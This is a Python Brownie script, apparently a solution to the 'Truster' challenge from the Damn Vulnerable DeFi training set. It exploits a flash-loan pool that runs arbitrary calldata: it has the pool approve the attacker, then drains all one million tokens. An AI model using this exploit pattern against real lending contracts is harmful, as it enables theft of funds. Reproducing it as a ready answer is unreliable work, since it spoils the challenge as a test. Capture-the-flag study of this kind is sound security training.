from scripts.helper.utils import *
from brownie import DamnValuableToken, TrusterLenderPool

def main():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################

    # starting setup messages
    message('setup_start')

    # tokens in pool
    TOKENS_IN_POOL = ether_to_wei(1000000)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker = define_from_acc(qty=2)

    # deploy the contracts
    token = DamnValuableToken.deploy(_fromDeployer)
    pool = TrusterLenderPool.deploy(token.address, _fromDeployer)

    # fund the pool
    token.transfer(pool.address, TOKENS_IN_POOL, _fromDeployer)

    # confirm the balances are correct
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL
    assert token.balanceOf(attacker.address) == 0

    # check if solved
    def solution_assertion():
        message('final_assertion_check')
        try:

            ############################################
            ############ SUCCESS CONDITIONS ############
            ############################################

            # Attacker has taken all tokens from the pool
            assert token.balanceOf(attacker.address) == TOKENS_IN_POOL
            assert token.balanceOf(pool.address) == 0
            return True

        except:
            return False

    # done setting up
    message('setup_end')
    message('solution_start')
# #########################################################
# More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
#
# Currently the pool has 1 million DVT tokens in balance. And you have nothing.
#
# But don't worry, you might be able to take them all from the pool. In a single transaction.
# #########################################################

    #############################
    ##### SOLUTION GOES HERE ####
    #############################

    # Encode a call to the DVT contract approving the attacker to take all the tokens from the pool
    attack_call = token.approve.encode_input(attacker.address, TOKENS_IN_POOL)

    # run the flash loan borrowing 0 tokens and passing the encoded call
    pool.flashLoan(0, pool.address, token.address, attack_call, _fromAttacker)

    # take all the tokens from the pool
    token.transferFrom(pool.address, attacker.address, TOKENS_IN_POOL, _fromAttacker)
        
###############################################################
###################### CHECKING SOLUTION ######################
###############################################################
    message('solution_end')
    print(f'Challenge is solved: {solution_assertion()}')
